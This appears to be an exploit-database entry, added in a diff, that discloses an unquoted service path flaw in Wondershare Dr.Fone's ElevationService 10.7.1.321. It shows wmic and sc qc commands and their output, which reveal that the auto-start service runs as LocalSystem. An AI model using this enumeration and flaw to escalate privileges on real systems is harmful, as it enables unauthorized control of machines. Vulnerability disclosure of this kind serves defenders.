@@ -1,0 +1,27 @@
+# Exploit Title: Wondershare Driver Install Service help 10.7.1.321 - 'ElevationService' Unquote Service Path
+# Date: 2020-11-24
+# Exploit Author: Luis Sandoval
+# Vendor Homepage: https://www.wondershare.com/
+# Software Link: https://www.wondershare.com/drfone/
+# Version: 10.7.1.321
+# Tested on: Windows 10 Home Single Language x64 Esp
+
+# Service info:
+
+C:\Users\user>wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+Wondershare Driver Install Service help    ElevationService   C:\Program Files (x86)\Wondershare\Dr.Fone\Addins\Recovery\ElevationService.exe     Auto
+
+C:\Users\user>sc qc ElevationService
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: ElevationService
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\Wondershare\Dr.Fone\Addins\Recovery\ElevationService.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Wondershare Driver Install Service help
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
